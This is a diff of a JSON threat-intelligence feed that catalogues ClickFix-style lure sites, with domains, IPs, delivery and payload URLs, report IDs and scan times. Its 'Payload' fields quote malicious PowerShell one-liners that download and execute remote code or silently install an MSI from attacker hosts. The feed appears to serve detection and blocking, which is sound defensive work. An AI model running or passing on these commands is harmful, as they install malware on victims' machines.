@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "update.sportela.bg",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "78.142.63.182"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515"
+    ],
+    "ReportId": "cmwfo93tk0gqe0oml1kpi8kea",
+    "ScannedAt": "2026-11-14T00:32:52.943000+00:00"
+  },
+  {
     "UrlDomain": "mattsphotos.com.au",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -976,132 +996,5 @@
     ],
     "ReportId": "cmwe9bjg00a3j0oml6v33yzhq",
     "ScannedAt": "2026-11-13T00:47:05.659000+00:00"
-  },
-  {
-    "UrlDomain": "t3dfleet.com",
-    "DeliveryUrl": [
-      "gfisoda.biz"
-    ],
-    "PayloadUrl": [
-      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
-    ],
-    "IP": [
-      "160.153.0.61"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://gfisoda.biz/clickfix/8e15947cbef29c2d"
-    ],
-    "ReportId": "cmwe912g309r10oml56qzo8en",
-    "ScannedAt": "2026-11-13T00:38:57.467000+00:00"
-  },
-  {
-    "UrlDomain": "lauradesing.com",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "69.10.33.22"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe8utpz09hc0omldgg04ffd",
-    "ScannedAt": "2026-11-13T00:34:06.241000+00:00"
-  },
-  {
-    "UrlDomain": "www.syncsectorpress.com",
-    "DeliveryUrl": [
-      "salesmarkllc.com",
-      "bingixllc.com"
-    ],
-    "PayloadUrl": [
-      "https://bingixllc.com/ztidwuofz51siqj6"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://salesmarkllc.com/1p8ma2fruuuqac52?_=1794528686348",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "powershell -nop -c \\\"$f=$env:TEMP+'\\\\clakr.ps1';curl.exe -sk -o $f 'https://bingixllc[.]com/ztIDWUOFZ51SiqJ6';powershell -ep bypass -File $f\\\"",
-    "ResolvedDownloadUrl": [
-      "https://bingixllc.com/ztIDWUOFZ51SiqJ6"
-    ],
-    "ReportId": "cmwe828jj08m80omlzcgd7pm1",
-    "ScannedAt": "2026-11-13T00:11:52.429000+00:00"
-  },
-  {
-    "UrlDomain": "bistrowhynot.de",
-    "DeliveryUrl": [
-      "rosrefurboss.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "89.110.145.43"
-    ],
-    "Related": [
-      {
-        "Value": "https://rosrefurboss.com/inline.php",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe81gep08kc0omlw78d528q",
-    "ScannedAt": "2026-11-13T00:11:15.970000+00:00"
-  },
-  {
-    "UrlDomain": "robinmack.com",
-    "DeliveryUrl": [
-      "klonfcrtyseaflow.com",
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "192.254.225.208"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwe7sk0008dh0omlccbh502j",
-    "ScannedAt": "2026-11-13T00:04:20.730000+00:00"
-  },
-  {
-    "UrlDomain": "www.routedesmetiers.com",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/Girya/61bc1e20936221ce"
-    ],
-    "IP": [
-      "109.234.161.39"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/Girya/61bc1e20936221ce')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/Girya/61bc1e20936221ce"
-    ],
-    "ReportId": "cmwe7r7jj08cs0oml2ruzlbeh",
-    "ScannedAt": "2026-11-13T00:03:17.928000+00:00"
   }
 ]
